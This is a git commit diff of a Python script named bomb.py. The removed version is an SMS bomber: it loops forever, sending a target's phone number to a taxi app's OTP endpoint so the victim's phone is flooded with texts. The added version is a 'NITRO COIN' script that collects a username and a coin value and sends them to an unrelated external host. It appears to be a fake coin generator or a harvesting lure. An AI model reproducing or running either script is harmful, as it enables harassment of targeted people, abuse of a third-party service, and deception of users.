19b7bc04e9c02cafdaf3d480546fff73a5a23e05
iliyacodes <90752542+iliyacodes@users.noreply.github.com>
2022-01-17 15:45:43 +0330

    Update bomb.py

--- bomb.py
+++ bomb.py
@@ -1,12 +1,32 @@
+import os
+os.system('pip install requests')
+os.system('pip install pyfiglet')
+os.system('pip install colorama')
+os.system('pip install Fore')
+os.system('pip install time')
+os.system('pip install requests')
+os.system('clear')
+
 import requests
 import time
-print("Cr: @iliya.tricks")
-phonenum = input("enter target phone number > ")
+import os
+import pyfiglet
+from colorama import Fore
 
-url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
-mydata = {"cellphone":"+98"+phonenum}
 
-while True:
-    requests.post(url,data=mydata)
-    print("1 sms sent")
-    time.sleep(5)
+print(Fore.GREEN + f"=========================================")
+banner = pyfiglet.figlet_format("NITRO COIN")
+print(Fore.GREEN + banner)
+print("Cr: @mioxiliya")
+print(Fore.GREEN + f"=========================================")
+
+usr = input(Fore.RED + f"[?] Enter your username: ")
+print(Fore.BLUE + f"[!] Username set to " + usr)
+coin = input(Fore.RED + f"[?] Enter coin value: ")
+print(Fore.BLUE + f"[!] Coin value set to " + coin)
+
+api = f"http://zux021.xyz/TD/nitro.php?un={usr}&c={coin}&submit=submit"
+try:
+    req = requests.get(api)
+except:
+    print("[!] Network connection error, Check your internet connection.")
